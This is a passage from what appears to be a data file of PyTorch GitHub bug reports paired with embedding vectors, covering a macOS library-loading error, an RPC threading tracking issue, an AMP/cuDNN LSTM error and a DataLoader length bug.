  0.53753674 -0.06349347 -0.01424923 -0.05068745 -0.2686185   0.528708
 -0.30702698 -0.1805067   0.05403674  0.06400289 -0.27094853  0.03428634
 -0.24967225 -0.08506125  0.18545368 -0.16404463  0.11987394 -0.30179155
  0.20007604  0.27543092  0.04508645 -0.10919496  0.217236    0.3180395
  0.19404806  0.33479926  0.0416921   0.3825562  -0.08805384 -0.13405526
  0.05879771 -0.07650222  0.27701992 -0.13045765 -0.31756622 -0.14951438
  0.00966951 -0.16242586 -0.1433053  -0.21559626  0.09193589  0.35418117
  0.05730291  0.28614342 -0.27247447 -0.00732763 -0.11489721 -0.00208183
  0.18476012  0.16795273 -0.1541277  -0.36851472  0.15155944 -0.03448347
 -0.38450876 -0.3993048  -0.0885538  -0.09489815 -0.23351589 -0.42682013
  0.09347731 -0.23172024  0.38009307  0.13855779 -0.2362212  -0.28277642
 -0.04451203 -0.21953633  0.26636365  0.09854241 -0.1704447   0.0346671
 -0.11035043 -0.05612569  0.04523064 -0.15154678  0.03762734  0.21662195
  0.14676163 -0.03802112 -0.27134803  0.07651134 -0.30519164  0.15149021
  0.14490677 -0.04063895  0.07524225 -0.01450247  0.14176986  0.45691776
 -0.00429455  0.01530037 -0.28469825  0.17610425 -0.20801081  0.06026287
  0.18051124  0.07642123  0.7080754   0.25084808  0.08986026 -0.06432328
 -0.01830719 -0.05014042  0.2100383   0.4300807   0.03877141  0.12322755
  0.19265936  0.06344074 -0.40788412  0.45770565  0.15582716 -0.17606348
  0.35802174 -0.25946993  0.31975895 -0.01885206  0.3281718   0.10630807
  0.48533496 -0.12762298  0.08513301 -0.26298788  0.0861283   0.10698093
 -0.1289612   0.00314089  0.20914525 -0.0552593  -0.02717725 -0.16924027
 -0.5120718  -0.1234732  -0.08574007  0.23252752  0.37147856  0.11743838
 -0.3758096   0.04771301  0.13965875 -0.3712184   0.10851976  0.21299706
 -0.5308689  -0.3035578  -0.05944166  0.1114879  -0.06994933 -0.17395361
  0.02995824  0.12205021  0.36954856 -0.23826283  0.07509381  0.2863701
 -0.11493434  0.41619527 -0.2235054   0.20716214 -0.26532364  0.50345045
  0.0140573  -0.0751588   0.09156946 -0.20568411 -0.20396668 -0.07129656
  0.19726901  0.06841171 -0.2456643  -0.1572773  -0.16817771 -0.0666665
 -0.25598955  0.18313283 -0.2120165   0.04345501  0.07981282 -0.00951279
 -0.18880138  0.545732   -0.10721839 -0.17853746 -0.00705544 -0.25668922
  0.03513037 -0.13580802 -0.18464598 -0.05354201  0.45113772  0.18965912
 -0.29232436 -0.4574869   0.11549135  0.09148516 -0.5519497   0.07869337
  0.04044688  0.4280067  -0.02796862  0.14241944  0.2310482   0.40521306
 -0.59360623  0.19758345 -0.5053992  -0.12947144  0.05901605 -0.04614205
 -0.09737381  0.00380336  0.271084    0.15527335 -0.25449163  0.27482903
 -0.30113098  0.36548188  0.23857771 -0.03834054  0.12014897  0.1561775
  0.20497335  0.09595574  0.11978078  0.20604473  0.34250405 -0.17117353]"
MacOS install error: Library not loaded: @rpath/libc++.1.dylib high priority module: binaries triaged module: macos,"## ðŸ› Bug

Install on MacOS fails with pip. 

## To Reproduce

```
(venv) âžœ  whatlies git:(master) âœ— python -m pip install torch
(venv) âžœ  whatlies git:(master) âœ— python                            
Python 3.7.7 (v3.7.7:d7c567b08f, Mar 10 2020, 02:56:16) 
[Clang 6.0 (clang-600.0.57)] on darwin
Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.
>>> import torch
Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
  File ""/Users/vincent/Development/whatlies/venv/lib/python3.7/site-packages/torch/__init__.py"", line 81, in <module>
    from torch._C import *
ImportError: dlopen(/Users/vincent/Development/whatlies/venv/lib/python3.7/site-packages/torch/_C.cpython-37m-darwin.so, 9): Library not loaded: @rpath/libc++.1.dylib
  Referenced from: /Users/vincent/Development/whatlies/venv/lib/python3.7/site-packages/torch/_C.cpython-37m-darwin.so
  Reason: image not found
```

Google suggested doing this; 

```
(venv) âžœ  whatlies git:(master) âœ— brew install libomp               
```

That unfortunately did not work. 

## Expected behavior

No error. 

## Environment

```
(venv) âžœ  whatlies git:(master) âœ— python collect_env.py 
Collecting environment information...
PyTorch version: N/A
Is debug build: N/A
CUDA used to build PyTorch: N/A

OS: Mac OSX 10.15.3
GCC version: Could not collect
CMake version: Could not collect

Python version: 3.7
Is CUDA available: N/A
CUDA runtime version: Could not collect
GPU models and configuration: Could not collect
Nvidia driver version: Could not collect
cuDNN version: Could not collect

Versions of relevant libraries:
[pip3] numpy==1.18.3
[pip3] torch==1.3.1
[pip3] torchvision==0.5.0
[conda] Could not collect
```

cc @ezyang @gchanan @zou3519 @bdhirsh @seemethere @malfet @walterddr",True,"[-2.65078902e-01 -4.41043496e-01  1.78999960e-01 -1.13635734e-02
  2.19522603e-02 -9.08797607e-02 -2.11464047e-01  8.31489488e-02
 -3.48707139e-02 -2.99152106e-01 -7.10819215e-02 -3.45497370e-01
 -1.24562114e-01  2.96973228e-01 -2.46105552e-01  9.04375762e-02
 -1.11541763e-01 -5.14413953e-01  7.19746724e-02  1.68218195e-01
  4.88088056e-02 -8.11847448e-02 -8.41627270e-02  3.49703282e-02
  1.03670403e-01  1.73436716e-01 -5.34901619e-02  1.77197725e-01
 -9.80840474e-02  1.98478669e-01 -8.07678141e-03  6.88031316e-03
 -3.39695036e-01  3.21242899e-01  6.32079482e-01  1.23746827e-01
 -1.29688501e-01 -3.17595631e-01 -4.08981502e-01 -3.13250184e-01
  1.83538795e-01  7.18940571e-02  1.24205910e-02 -2.89459992e-02
 -1.21246643e-01 -1.04129851e-01  1.39261127e-01 -1.60767525e-01
 -2.82819569e-01  5.97636700e-02 -3.84789735e-01  6.05035871e-02
 -6.13868572e-02 -1.57500073e-01  3.92127335e-01  5.38089033e-03
 -3.06748778e-01  2.48814538e-01  3.14979732e-01 -5.26966527e-02
  6.68420345e-02  2.08427310e-01  1.40911996e-01  5.49427420e-03
  2.92306542e-01  3.38721871e-02 -1.67520732e-01  7.04099797e-03
  3.77999902e-01 -1.48933366e-01  3.44495699e-02  8.03440902e-03
 -2.49894500e-01 -7.94353038e-02 -4.74832207e-02  8.38775858e-02
 -1.31837279e-01 -7.82992318e-02 -4.10832673e-01  1.70085505e-01
 -1.65531337e-01  8.31867009e-02 -1.59365535e-01  3.83068740e-01
  6.75146133e-02 -2.05458060e-01 -1.93268642e-01 -8.77498463e-02
  1.70801003e-02  1.57746002e-02  5.73502421e-01  2.66812950e-01
  1.76014632e-01  1.97098508e-01  3.67686063e-01 -2.17226177e-01
  2.81180859e-01  2.50173975e-02 -2.69775718e-01 -9.17753428e-02
  1.99212819e-01 -2.68296897e-01 -2.30087787e-02  2.85615206e-01
  1.87748671e-01 -3.64951268e-02  2.17176527e-01 -6.44114092e-02
  2.97489464e-02 -6.29547089e-02  2.32294649e-01  1.49740338e-01
  1.56651735e-01 -9.97224748e-02  4.31022532e-02  1.28908798e-01
 -6.97875738e-01  1.90526426e-01 -3.45512964e-02  4.93954718e-01
 -1.42417803e-01 -1.37567431e-01  6.66113347e-02  1.27452090e-01
  3.95516515e-01  1.65845782e-01 -3.44492681e-02 -7.39650950e-02
 -2.52873540e-01  1.84899084e-02 -2.50780452e-02  1.83890551e-01
 -1.32080674e-01 -2.11251341e-02  2.74542123e-01  4.10002768e-01
 -2.54301965e-01 -4.36858714e-01 -4.01800483e-01 -7.45446980e-02
 -1.52218521e-01  1.23609282e-01 -4.14209813e-02 -2.70785689e-01
  9.53918993e-02 -2.63212640e-02  3.87036353e-02  1.15806028e-01
 -1.75777841e-02 -3.63280997e-02  1.85084432e-01 -2.18055800e-01
 -4.63943005e-01  3.96957755e-01  2.39485189e-01 -4.75796834e-02
  3.37284744e-01  2.03194499e-01 -1.78246915e-01 -2.15586215e-01
  1.66454583e-01  2.28854641e-02 -7.18234479e-02  2.90359139e-01
 -1.36438414e-01 -6.64289668e-02 -5.16824961e-01 -1.65257752e-01
 -1.34577140e-01  3.91011648e-02 -2.42305070e-01 -1.14888474e-02
  2.98144758e-01 -1.55987546e-01 -4.25516367e-02 -1.62944019e-01
  3.75487298e-01 -1.09484538e-01  2.07660049e-02 -6.67035356e-02
  3.45420837e-01  2.18599617e-01 -3.49481963e-02  1.58662289e-01
  7.15301335e-02  2.33569443e-02 -8.53266269e-02 -2.97372397e-02
 -1.95295233e-02 -4.88854870e-02 -1.45646736e-01  2.99614519e-02
  4.98250961e-01 -2.62549408e-02  5.67915989e-03  2.47370556e-01
  2.65259087e-01  1.70604408e-01 -1.69348549e-02  8.98874775e-02
 -9.28963572e-02  9.06991661e-02 -1.59935176e-01 -9.51296687e-02
 -2.07391053e-01  3.33307125e-03  5.02810255e-02  1.79587193e-02
 -5.54345369e-01 -2.68383995e-02 -1.70446128e-01 -1.93595048e-03
  1.17902614e-01 -8.58552456e-02 -3.06389108e-02  4.31788445e-01
 -2.12619863e-02  1.45634159e-01  1.45267829e-01 -2.16474175e-01
 -3.27585861e-02 -6.01951033e-03 -1.30469024e-01 -2.32714713e-01
 -8.43025744e-04  9.75192040e-02 -9.37608480e-02  3.32924247e-01
  1.01823278e-01 -1.74498737e-01 -3.96450996e-01 -2.32453361e-01
  3.56320202e-01 -4.00067791e-02  5.78808505e-03  1.66062955e-02
  3.25265646e-01 -2.40032271e-01 -1.41940027e-01  1.40682876e-01
 -2.33269036e-01 -3.57920192e-02  1.31797910e-01 -8.76285136e-02
 -7.29815811e-02 -1.55858859e-01  1.81086920e-02 -8.44220817e-02
 -2.36154065e-01  1.26665637e-01  3.67210239e-01 -3.23132575e-01
 -4.87715378e-02 -6.26468984e-03  1.54218614e-01  1.83645293e-01
 -2.82443136e-01 -1.55683726e-01  1.14486068e-01  3.61635946e-02
 -1.19102545e-01  5.79472423e-01  2.29986012e-01  2.15323031e-01
  1.23230882e-01  1.25850558e-01 -3.31634909e-01  9.69008878e-02
 -1.09012254e-01  2.27519661e-01  5.56329131e-01 -3.58580172e-01
  6.91745579e-01 -5.50749525e-02  5.43108284e-02 -1.75142661e-03
  1.99990779e-01 -4.26882207e-02  2.87631333e-01  1.50441378e-01
 -1.51389211e-01  5.20201325e-01 -2.56910414e-01  1.45278528e-01
  3.25273454e-01 -1.27367117e-02  1.19356185e-01 -5.31991720e-01
 -4.67302084e-01  1.66180074e-01 -6.93440288e-02 -1.38071045e-01
  4.34333161e-02  7.33106211e-02 -4.36572805e-02  7.45061487e-02
  1.57285273e-01 -1.37483805e-01  2.04502091e-01  1.21972390e-01
 -2.95809716e-01  2.94399559e-01  2.05123693e-01 -9.87571701e-02
  4.97885346e-02  1.36400377e-02 -3.00455689e-01  3.09734717e-02
  5.27741909e-01 -2.80551344e-01  4.74729896e-01  5.34082688e-02
 -7.70440474e-02  1.76386803e-01  1.09667860e-01  1.45095915e-01
 -1.30255356e-01  9.21591073e-02  2.19301768e-02 -1.71517506e-01
  2.34590739e-01 -9.27441269e-02 -8.70889485e-01 -3.32534015e-02
  3.17933351e-01 -1.94432661e-02 -4.73881841e-01  2.49054343e-01
 -1.33367389e-01  2.45540500e-01  3.14071894e-01  5.18991053e-02
 -2.67464548e-01  3.36062372e-01 -2.82977074e-01  4.44250293e-02
 -1.20986983e-01  2.93624461e-01 -7.84405693e-02 -5.39637387e-01
  2.41340116e-01 -4.74212617e-01  3.56967270e-01 -2.16801494e-01
 -1.38093859e-01 -2.02116802e-01  1.84762806e-01  1.04109600e-01
 -4.13340889e-03 -1.04307681e-01  4.26244140e-02 -1.25330657e-01
 -5.72937965e-01  3.82499546e-02 -5.18972520e-04  9.46802646e-02
  5.25589809e-02  1.46316171e-01  4.82473254e-01  1.42931640e-01
 -1.84618726e-01  9.14894138e-03 -4.27266896e-01 -1.60198778e-01
 -2.72250712e-01  1.56294838e-01 -4.21034127e-01  3.81133258e-01
 -4.09022152e-01  3.48764002e-01 -3.38740230e-01 -1.24523126e-01
 -2.32105225e-01 -6.05188385e-02  4.51187253e-01  1.78927273e-01
  2.11679339e-01  1.32584214e-01 -7.58741498e-02 -1.82577580e-01
  2.67097831e-01  2.16999561e-01  9.57136601e-02 -1.65275887e-01]"
Make RPC internal messages/callbacks work with single-threaded agent triaged module: rpc,"@lw and @jiayisuse brought up a great point that RPC system should work correctly even if the agent only uses a single thread to process all internal messages. Otherwise, the correctness of RPC will depend on the thread number configuration, which is not ideal. Currently, RPC does not work that way, as there are still multiple places that block and require a different thread to unblock. Creating this issue to track progression to make RPC compatible with single-threaded agent implementation. This is required by `TensorPipe` integration.

- [x] `RRef.to_here()`(i.e., `SCRIPT_RREF_FETCH_CALL` and `PYTHON_RREF_FETCH_CALL`) blocks until the owner RRef is created. It should return a future instead. (#36805 )
- [x] For `OwnerRRef`, `PyRRef::unpickle` blocks until the `OwnerRRef` is created. Since `RRefForkData` already contains the `TypePtr`, it can instead directly create the `OwnerRRef` instance. (@wanchaol please correct me if I am wrong, thx!)  (#36785)

cc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @gqchen @aazzolini @rohan-varma @xush6528 @jjlilley @osalpekar",True,"[-2.70218849e-01 -4.07676697e-01 -5.23776293e-01 -5.61267063e-02
 -3.76457125e-02  4.25146781e-02 -2.29504973e-01 -8.29651579e-02
 -3.90642256e-01 -4.52035628e-02 -2.60954034e-02  2.44290739e-01
  2.01831132e-01  1.70998380e-01  9.67296660e-02  9.36916992e-02
  6.03787601e-03 -7.48047382e-02 -2.22416595e-02  1.68751135e-01
 -3.15737307e-01 -1.78533971e-01  6.51052296e-02  2.91174408e-02
 -1.84349641e-02 -4.11904931e-01  1.03735477e-01 -1.71237782e-01
 -1.85926184e-02  1.35739446e-01  3.67353082e-01  2.46767718e-02
  1.01954453e-01 -2.57172406e-01 -1.44618064e-01  3.78083676e-01
 -3.27186733e-01 -2.32046068e-01  2.05563754e-03  1.59556612e-01
  6.93138614e-02  3.16425145e-01  3.66561145e-01 -2.15192195e-02
 -3.11760344e-02  1.08818799e-01 -1.38568372e-01  1.06611967e-01
 -2.53233880e-01 -1.34740964e-01 -1.98539764e-01  1.26137316e-01
 -1.46069154e-01 -4.20961678e-02 -1.73895344e-01 -5.61257377e-02
 -3.90444137e-03  8.66701752e-02  4.10218239e-02 -1.34109110e-01
  3.63027990e-01 -2.19765037e-01  8.03603679e-02 -1.36414170e-01
  2.81788766e-01 -5.92268035e-02  3.90382856e-02 -5.00872619e-02
  5.00607193e-01  2.55910754e-01 -1.83669180e-01 -2.17074171e-01
 -3.12951952e-01 -1.71519071e-01 -5.46257198e-02  1.61264777e-01
 -2.63587832e-01  3.53837460e-02  3.52168798e-01 -2.11766303e-01
 -1.40712216e-01  1.07969567e-01  1.47290722e-01  6.01302907e-02
  8.44277740e-02 -4.24174629e-02  1.59923106e-01 -3.00208092e-01
  2.87295491e-01  4.19838801e-02  6.00784421e-01  3.88403118e-01
  1.29408598e-01  2.17075989e-01  4.58147563e-02  1.01282626e-01
 -1.14552014e-01  3.37047502e-02 -4.86510158e-01 -5.55767044e-02
  2.64762249e-02 -1.69181645e-01 -3.62998366e-01  5.11598326e-02
  1.02158226e-01 -1.74519211e-01 -2.47796997e-03  6.37945235e-02
 -1.97884217e-01 -1.39176566e-02  6.71532825e-02  2.64534533e-01
 -2.52372503e-01 -2.21739262e-01 -7.55308941e-03  3.67233157e-01
  2.28599340e-01  7.79329762e-02 -3.20094287e-01  2.10070461e-01
  7.21077770e-02 -2.88797438e-01  1.81236744e-01 -8.56366009e-02
  1.13975897e-01  9.53392088e-02 -1.51052818e-01 -4.06795144e-02
 -6.59566373e-02  3.09365895e-03  1.59429580e-01 -1.34089857e-01
 -8.47250670e-02 -6.77783340e-02  6.06461242e-03 -2.69617531e-02
  5.26373498e-02 -1.65282398e-01 -1.32211417e-01  2.02044860e-01
  2.37015754e-01  2.29405034e-02 -2.73953527e-01 -7.12566450e-02
 -5.58968410e-02  8.56648237e-02 -1.81501433e-01  1.08587325e-01
  1.09657541e-01  1.45644605e-01  2.13403821e-01 -2.01368675e-01
  5.03180549e-04 -3.83081883e-02  3.52772355e-01  8.71234164e-02
 -2.93427892e-02 -2.58731395e-02  1.91436648e-01 -2.61338890e-01
 -1.19194433e-01  3.18146110e-01  4.63644117e-02 -2.81653404e-01
  5.18453978e-02 -4.03174497e-02  1.35911345e-01 -3.31594050e-02
 -2.65371650e-01  1.03389863e-02 -1.72542900e-01 -2.79156476e-01
  1.05970457e-01 -6.03160262e-02  6.68990910e-02  6.73430711e-02
 -4.12854314e-01 -2.86846161e-02  3.15461040e-01  1.41204864e-01
  1.88950479e-01  1.68409124e-01  8.91583860e-02 -1.80686768e-02
 -6.90501779e-02  2.96754539e-01  5.11594713e-01  5.61551787e-02
  5.89908138e-02 -1.02116220e-01 -7.50813931e-02 -7.09911659e-02
  3.01272254e-02 -9.24966112e-02  1.29277229e-01 -3.05550814e-01
 -4.28899284e-03  2.45420903e-01  1.89527810e-01  3.22546624e-02
  2.35293638e-02 -5.57072386e-02 -1.59442768e-01 -1.79918427e-02
 -9.24024731e-04 -6.98606446e-02 -1.89930499e-01 -1.72338746e-02
 -4.60977554e-01  3.02103102e-01 -3.06507528e-01  2.34940410e-01
  1.91950262e-01 -1.15309849e-01 -1.66254073e-01 -3.67455721e-01
 -2.60427445e-01  3.09340984e-01  3.06786180e-01  1.16363645e-01
 -2.31870115e-02 -1.46336645e-01  3.41898739e-01 -2.71740586e-01
  3.70770618e-02 -9.67281535e-02  3.67944837e-02 -1.13881916e-01
 -3.22440922e-01 -1.32387459e-01  9.38287228e-02 -1.16290934e-01
  5.90377331e-01  2.82572448e-01 -1.03778556e-01 -9.52164382e-02
 -2.51016855e-01  1.94003701e-01  2.67723668e-02 -2.20890835e-01
 -1.17799111e-01  3.18966433e-02 -1.64662719e-01 -1.56153202e-01
  8.53800029e-02  6.81578219e-02  2.43381448e-02  3.50908667e-01
  2.03253895e-01  3.27674896e-02 -1.14275038e-01 -4.61148918e-02
  1.69323474e-01 -1.85329899e-01 -1.59920044e-02  1.13425404e-01
 -2.85829306e-01  1.61038592e-01 -6.97779842e-03  2.04105750e-01
  9.30043459e-02  4.13152814e-01  4.27672528e-02  2.13750452e-01
  3.38432938e-01  2.03556508e-01 -2.70410687e-01 -2.42716260e-02
 -4.82314862e-02 -3.42549443e-01 -1.49861127e-01  8.75909925e-02
 -2.98811585e-01  1.16924763e-01  2.38202959e-01  1.29084572e-01
  4.47137952e-01  5.48858792e-02 -3.13757509e-01  1.31370023e-01
  1.63602471e-01  3.51932079e-01 -4.91570756e-02  1.93030328e-01
 -1.55683281e-02 -5.75002193e-01 -3.73276658e-02 -2.34772295e-01
  1.80165559e-01 -2.23886102e-01  6.94870278e-02 -3.41236621e-01
  1.36312395e-01 -1.96855932e-01  7.59668872e-02  3.96003902e-01
 -3.21262702e-02 -2.29093015e-01 -1.19685065e-02  2.73161262e-01
 -1.69622824e-02 -2.56861508e-01 -3.88223082e-02  1.02187179e-01
 -2.45205015e-02 -6.01368472e-02  3.41204345e-01  2.78008699e-01
  3.81449282e-01 -2.99893886e-01  2.16828167e-01 -4.08056565e-03
  1.55471176e-01  3.76773179e-02 -1.70253336e-01  1.92499042e-01
  2.21578568e-01  2.08655432e-01 -1.31729305e-01  1.92618370e-03
 -2.59444356e-01  5.15853986e-03 -6.93263486e-02 -4.54835296e-02
  2.50334255e-02  2.63839006e-01 -3.82720053e-01 -3.71949166e-01
  2.15937234e-02  2.97217637e-01  4.05732453e-01  2.60605291e-03
  4.98755798e-02  1.34946704e-01 -5.96118793e-02 -5.23175895e-02
 -5.08729666e-02  1.23236530e-01 -2.01505095e-01  1.32268667e-01
 -5.50997891e-02  1.07483603e-01 -2.30985165e-01  8.83961394e-02
 -2.40089998e-01 -1.76217720e-01  3.73082668e-01  5.52907526e-01
  6.65586665e-02 -1.84724450e-01  9.87720042e-02 -2.04446077e-01
  6.00451753e-02  1.09642081e-01 -4.16606605e-01  3.66800010e-01
  5.35061210e-02 -1.40738904e-01 -6.36843294e-02  1.14064626e-01
 -3.77020866e-01 -4.27713320e-02 -9.19686630e-02 -7.68607855e-03
 -2.38408908e-01 -3.32653344e-01 -8.17357898e-02 -1.99343920e-01
  8.14141631e-02  1.06334358e-01 -7.12034404e-02  2.53267407e-01
 -4.70988490e-02  2.01315343e-01  1.08141772e-01 -4.53032315e-01
 -2.97734179e-02 -2.62435228e-02  3.85239162e-02  2.78536379e-01
 -3.89415137e-02  1.88741893e-01 -1.85674578e-01 -8.13958049e-02]"
AMP autocast error in cnn-lstm forward module: cudnn triaged,"## ðŸ› Bug

get cuDNN error: CUDNN_STATUS_BAD_PARAM in cnn-lstm network forward method

## To Reproduce

```
import torch
from torch import nn, optim
from torch.cuda.amp import GradScaler, autocast

class Net(nn.Module):
    def __init__(self):
        super(Net, self).__init__()
        self.conv1 = nn.Conv1d(1, 10, 2)
        self.lstm = nn.LSTM(input_size=10, hidden_size=10,
                                batch_first=True,bidirectional=True)

    def forward(self, x):
        x = self.conv1(x)
        x = x.permute(0, 2, 1)
        x, _ = self.lstm(x)
        return x


net = Net().cuda()
net.train()
optimizer = optim.SGD(net.parameters(), lr=1e-3)

scaler = GradScaler()

optimizer.zero_grad()

with autocast():
    output = net(torch.rand(10,1,10).cuda())
```

## Environment
torch==1.6.0 nightly (2020-04-10)

@mcarilli 

cc @csarofeen @ptrblck",True,"[-4.05465394e-01 -2.93026865e-01 -6.99158460e-02  1.13946814e-02
  2.68762797e-01 -1.37358280e-02  1.86979577e-01 -6.09455556e-02
 -4.55887020e-01  1.01463273e-01 -1.46753024e-02  8.25567171e-03
  9.42382589e-03 -1.27122909e-01 -1.94637179e-01  9.61792842e-03
 -2.01204062e-01 -9.63973254e-02  2.60073505e-03 -2.28021853e-02
  2.86869198e-01 -3.65041643e-02 -1.63974538e-01 -1.86787799e-01
  1.73525721e-01 -7.03153089e-02 -3.29954028e-01 -7.54824001e-03
  2.88292408e-01  2.96487808e-02  1.82714313e-01 -1.26578853e-01
 -3.14583361e-01  3.62575173e-01  8.52809474e-02 -7.94991702e-02
 -2.16903403e-01 -2.56389916e-01 -2.47975826e-01 -7.84448460e-02
  5.34352779e-01 -8.57788399e-02 -1.64699242e-01 -1.92860886e-01
  1.12669431e-01 -1.96645707e-02 -8.64794925e-02  2.39410758e-01
 -7.96174556e-02 -2.92664468e-01 -1.57228664e-01  3.50810960e-02
 -3.63510251e-01  4.04529274e-04  1.99109957e-01 -1.01641484e-01
 -1.95510179e-01  2.60250270e-01  3.71737659e-01 -1.00765832e-01
  2.87580699e-01 -3.09909880e-01 -1.68304682e-01 -3.29357058e-01
  1.40415192e-01 -1.18365631e-01 -2.90612251e-01  2.26918787e-01
  3.64693105e-01 -1.37029544e-01 -1.43163800e-01  2.09677279e-01
 -2.96388030e-01  1.98718131e-01  1.72687650e-01 -5.43940440e-02
 -2.75159210e-01  9.77393389e-02 -2.98089266e-01 -2.39323765e-01
  1.93701714e-01  1.74010187e-01 -9.31457877e-02  2.02935617e-02
  2.47048840e-01 -8.37647617e-02  1.39470845e-01  6.17731586e-02
  2.26449668e-01  2.57000118e-01 -5.04646525e-02 -4.98795137e-02
  1.00871801e-01  3.35970283e-01  1.45525172e-01 -9.82889757e-02
  2.03573048e-01 -3.23642015e-01 -2.51325630e-02 -2.04648703e-01
 -1.94909826e-01 -5.14240026e-01 -2.88166881e-01  5.35770655e-01
  4.57605487e-03 -3.90703678e-01  1.87542900e-01  6.51425600e-01
 -7.76389688e-02 -2.71122932e-01  1.67147145e-02  1.73930302e-01
  8.57908875e-02 -3.34688038e-01  3.41057032e-02  1.19555436e-01
 -2.81583667e-01 -9.76508036e-02 -5.69661334e-02  3.59013826e-02
 -2.20221147e-01  2.14478791e-01  7.01619834e-02  3.44238549e-01
  4.39694226e-01  6.96836263e-02  1.90458342e-01 -3.43840808e-01
 -7.14722872e-02  2.71295607e-01 -4.71696630e-02  1.04761668e-01
  8.66929367e-02  3.19426656e-02  1.98566914e-01  2.16571689e-01
 -3.96292299e-01 -2.48083726e-01  3.12781371e-02 -1.31410420e-01
 -1.94447324e-01  1.61304370e-01 -1.96340844e-01 -1.14177644e-01
  3.49847674e-01 -2.06062317e-01 -1.87236622e-01 -7.12343166e-03
  1.18932754e-01 -2.78541774e-01  1.07374534e-01 -2.82153428e-01
 -6.82376266e-01  1.55915841e-01  6.61345422e-02  2.34338254e-01
  5.41548014e-01 -2.42794827e-02  4.34044063e-01 -1.17949396e-01
  3.51467013e-01  3.00063252e-01  2.22567230e-01  3.59919667e-02
  1.84523821e-01 -6.92285001e-02 -1.17383957e-01  9.20273587e-02
 -4.48417425e-01  1.95217356e-01 -3.34977418e-01 -3.93130064e-01
 -2.39825517e-01 -1.94652695e-02  6.45947456e-02 -1.26642764e-01
  1.85209475e-02 -1.84261978e-01 -9.24367905e-02  2.87882447e-01
  2.88795829e-02  1.56990871e-01  2.74206549e-01  2.32911125e-01
  1.15699634e-01  3.04935835e-02  1.20808959e-01 -1.43540557e-02
 -1.06977299e-01 -2.09563561e-02 -2.67377436e-01 -2.66308933e-02
  3.07057619e-01  1.83829576e-01  1.26656055e-01  1.32843331e-01
  9.63806510e-02 -8.43716115e-02 -6.68688416e-02  3.52727696e-02
 -4.61140633e-01 -4.31490168e-02  1.08546121e-02  3.28313708e-01
  6.55535311e-02 -1.38164237e-01 -4.81993735e-01 -7.30180591e-02
 -3.09220999e-01  2.79110849e-01 -1.98052377e-01 -1.77588433e-01
 -1.08924657e-01 -3.37989867e-01 -2.92615015e-02  4.31040972e-02
  3.85714956e-02  9.04998705e-02  1.89798504e-01  2.16078430e-01
  1.51233360e-01 -3.25496554e-01  6.89731911e-04 -4.47147973e-02
  2.60017753e-01  2.20149755e-01 -3.56651187e-01  2.23880291e-01
 -3.97202894e-02  1.71615884e-01 -1.25157744e-01  2.96138506e-02
  4.72172797e-01  1.73559323e-01  1.12323053e-01  7.20127374e-02
  1.33540615e-01  3.58383581e-02 -9.78154317e-03 -1.11287087e-03
 -2.53524274e-01  4.63976413e-02 -1.59941927e-01 -5.58745675e-02
 -2.89027631e-01 -8.48576576e-02 -3.21283579e-01 -7.80732930e-02
 -2.86188781e-01 -6.04143962e-02  1.20293312e-01  2.82819420e-01
 -5.78447580e-02 -2.30419934e-01  2.01553583e-01  2.52300471e-01
 -5.04373237e-02 -2.59620905e-01 -5.82813881e-02  2.64776379e-01
  1.02711990e-01  3.24883401e-01 -1.87354945e-02  9.33831930e-02
  1.58240974e-01 -1.20057538e-03 -2.46324494e-01  6.77188039e-02
  4.49146517e-03 -2.01912403e-01  5.61392903e-02 -3.50313753e-01
  2.02047676e-01  3.49734634e-01  1.60507619e-01 -1.15093619e-01
  2.22720817e-01 -2.83214390e-01  1.49214357e-01 -1.58391595e-01
  2.70320952e-01  4.40013051e-01 -9.80420038e-02 -3.00683156e-02
  4.30295736e-01 -3.49269807e-01 -2.91382700e-01 -2.91025043e-01
 -4.04349089e-01 -2.32534587e-01  6.20028153e-02  1.26654446e-01
  6.56201541e-01  8.05130228e-02 -1.69454455e-01  7.75534883e-02
  4.03995514e-01 -3.16349387e-01 -4.81326878e-02 -1.06871046e-01
 -1.90812990e-01  5.19333124e-01  3.06264639e-01 -5.35754859e-02
 -3.32553148e-01  1.94627821e-01  3.10189389e-02  4.04823720e-02
  5.64882517e-01 -3.61417949e-01  4.50610340e-01  1.43302172e-01
 -1.54517859e-01  4.00335714e-02 -1.35171503e-01 -1.33638605e-02
  8.16282481e-02  3.32839489e-01  1.61372632e-01  6.29255772e-02
 -7.99132288e-02 -3.97811979e-01 -3.07155043e-01  2.92630494e-01
  8.19928423e-02  7.01458603e-02 -1.38340563e-01  9.99257937e-02
 -7.15913624e-02  2.52131462e-01 -2.14451611e-01  1.21875651e-01
  1.30043328e-01  1.64038867e-01 -2.49424540e-02 -2.09284917e-01
  2.40879431e-02  2.28569329e-01  1.06079504e-02 -2.16728479e-01
 -3.34197283e-01  5.20130619e-02 -4.53259386e-02  1.49860725e-01
 -6.96953833e-02 -2.58706331e-01  7.04472214e-02  1.30277872e-03
 -9.07699019e-02  1.36589661e-01 -2.00370669e-01 -1.26441896e-01
 -1.80870473e-01 -4.60307635e-02 -2.53237009e-01  5.99440813e-01
  5.04403487e-02  7.80833960e-02  5.07008843e-03  2.97479570e-01
  3.46024215e-01  1.31904840e-01 -1.17707878e-01 -2.67773390e-01
 -2.79617876e-01  2.30461419e-01  1.69770002e-01 -2.90467918e-01
  9.84326154e-02  1.15156230e-02 -9.09038261e-02  7.06783086e-02
 -7.23083317e-02  5.65000325e-02  2.92250961e-01  3.57552543e-02
 -2.67615542e-04 -2.05154389e-01  2.98378885e-01  1.70316398e-01
 -3.61173093e-01  2.80083179e-01 -1.03542835e-01 -2.13548511e-01]"
len(DataLoader) doesn't take into account DataLoader.batch_size when using IterableDataset module: dataloader triaged,"## ðŸ› Bug

The length of a `DataLoader` when using a map `Dataset` is the defined by the sampler, usually defaulting to `BatchSampler`'s method which divides the number of examples in the dataset by the batch size. When using an `IterableDataset` it just returns `len(IterableDataset)`, rather than `len(IterableDataset) // batch_size`. If the `IterableDataset` defines `__len__`, and `loader.batch_size > 0` then the loader will only ever return `len(IterableDataset) // batch_size` batches, so the loader should return this as it's length. This occurs with single process data loading, I understand that multiprocess has other complexities which will cause this to fail in other ways.

## Expected behavior

`len(loader) == (len(dataset) // batch_size)`

## Environment

 - PyTorch Version (e.g., 1.0): 1.4.0
 - OS (e.g., Linux): Linux
 - How you installed PyTorch (`conda`, `pip`, source): pip
 - Python version: 3.6
 - CUDA/cuDNN version: n/a
 - GPU models and configuration: n/a


